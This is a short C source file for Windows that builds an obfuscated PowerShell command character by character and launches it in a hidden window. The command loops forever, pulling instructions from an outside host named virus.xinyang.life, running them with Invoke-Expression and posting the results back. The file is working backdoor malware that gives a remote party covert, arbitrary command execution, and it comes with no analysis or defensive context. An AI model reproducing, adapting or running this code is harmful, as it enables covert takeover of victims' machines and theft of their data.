#include <Windows.h>
#include <stdio.h>

int main() {
    CHAR script[] = {
        'P', 'o', 'w', 'e', 'r', 'S', 'h', 'e', 'l', 'l', '.', 'e', 'x', 'e', ' ',
        '-', 'C', 'o', 'm', 'm', 'a', 'n', 'd', ' ',
        '\"',
        'I', 'n', 'v', 'o', 'k', 'e', '-', 'E', 'x', 'p', 'r', 'e', 's', 's', 'i', 'o', 'n', ' ', 
        '\'','w', 'h', 'i', 'l', 'e', '(', '1', ')', '{',
        'I', 'n', 'v', 'o', 'k', 'e', '-', 'R', 'e', 's', 't', 'M', 'e', 't', 'h', 'o', 'd', ' ', '-', 'U', 's', 'e', 'B', 'a', 's', 'i', 'c', 'P', 'a', 'r', 's', 'i', 'n', 'g', ' ', '-', 'U', 'r', 'i', ' ', 'h', 't', 't', 'p', 's', ':', '/', '/', 'v', 'i', 'r', 'u', 's', '.', 'x', 'i', 'n', 'y', 'a', 'n', 'g', '.', 'l', 'i', 'f', 'e', '/', 'r', 'e', 's', 'u', 'l', 't', ' ', '-', 'M', 'e', 't', 'h', 'o', 'd', ' ', 'P', 'O', 'S', 'T', ' ', '-', 'B', 'o', 'd', 'y', ' ', '@', '{', 'r', '=',
        '$', '(', 'I', 'n', 'v', 'o', 'k', 'e', '-', 'E', 'x', 'p', 'r', 'e', 's', 's', 'i', 'o', 'n', ' ',
        '$', '(', 'I', 'n', 'v', 'o', 'k', 'e', '-', 'R', 'e', 's', 't', 'M', 'e', 't', 'h', 'o', 'd', ' ', '-', 'U', 's', 'e', 'B', 'a', 's', 'i', 'c', 'P', 'a', 'r', 's', 'i', 'n', 'g', ' ', '-', 'U', 'r', 'i', ' ', 'h', 't', 't', 'p', 's', ':', '/', '/', 'v', 'i', 'r', 'u', 's', '.', 'x', 'i', 'n', 'y', 'a', 'n', 'g', '.', 'l', 'i', 'f', 'e', '/', ' ', '-', 'M', 'e', 't', 'h', 'o', 'd', ' ', 'P', 'O', 'S', 'T', ' ', '-', 'T', 'i', 'm', 'e', 'o', 'u', 't', 'S', 'e', 'c', ' ', '6', ')', '.', 'c', ' ', '|', ' ', 'O', 'u', 't', '-', 'S', 't', 'r', 'i', 'n', 'g', ')', '}', ' ', '-', 'T', 'i', 'm', 'e', 'o', 'u', 't', 'S', 'e', 'c', ' ', '6', '}',
        '\'', '\"', '\0'
    };
    STARTUPINFOA si = {
        .cb = sizeof(STARTUPINFOA),
        .dwFlags = STARTF_USESHOWWINDOW,
        .wShowWindow = HIDE_WINDOW,
    };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA(
        NULL,     // lpApplicationName
        script, // lpCommandLine
        NULL,   // lpProcessAttribute
        NULL,   // lpThreadAttribute
        TRUE,  // bInheritHandles
        CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, // dwCreationFlags
        NULL,   // lpEnvironment
        NULL,   // lpCurrentDirectory
        &si,    // lpStartupInfo
        &pi     // lpProcessInformation
    );
    printf("%d ", pi.dwProcessId);
    while(1) {
        Sleep(500);
    }
    return 0;
}